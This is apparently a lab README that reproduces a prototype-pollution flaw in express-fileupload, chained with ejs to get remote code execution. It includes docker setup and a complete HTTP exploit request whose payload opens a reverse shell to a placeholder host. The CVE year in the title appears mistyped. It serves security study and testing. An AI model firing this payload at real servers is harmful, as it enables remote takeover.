# NodeJS expresss-fileupload protype pollution vulnerability（CVE-2022-7699）

[中文版本(Chinese version)](README.zh-cn.md)

## Vulnerability principle

`express-fileupload` is a express middleware for uploading files. In the version prior `1.1.7-alpha.4`, it has a protype pollution vulnerability. And if also the website use `ejs(<=3.1.6)` which is a template engine, the `outputFunctionName` parameter can be polluted by constructing a call chain, thereby causing remote code execution.

References：

- https://blog.p6.is/Real-World-JS-1/
- https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html

## Vulnerability Environment

Execute the following commands to start:

```bash
docker-compose build
docker-compose up -d
```

## Vulnerability Reproduce

After the server is started, you can visit the page at `http://your-ip:3000/`

![img](1.png)

Set a listener firstly, then send the following package which can reverse shell.

```text
POST /upload HTTP/1.1
Host: your-ip:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Length: 306
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypDa6OHB96f0GI9ze

------WebKitFormBoundarypDa6OHB96f0GI9ze
Content-Disposition: form-data; name="__proto__.outputFunctionName"

x;process.mainModule.require('child_process').exec('bash -c "bash -i &> /dev/tcp/your-ip/4444 0>&1"');delete Object.prototype['outputFunctionName'];x
------WebKitFormBoundarypDa6OHB96f0GI9ze--
```

PS：Afer send the package, the prototype of the whole program will be polluted. It maybe affect the normal access to the website unless reboot. So we need to remove polluted protype.
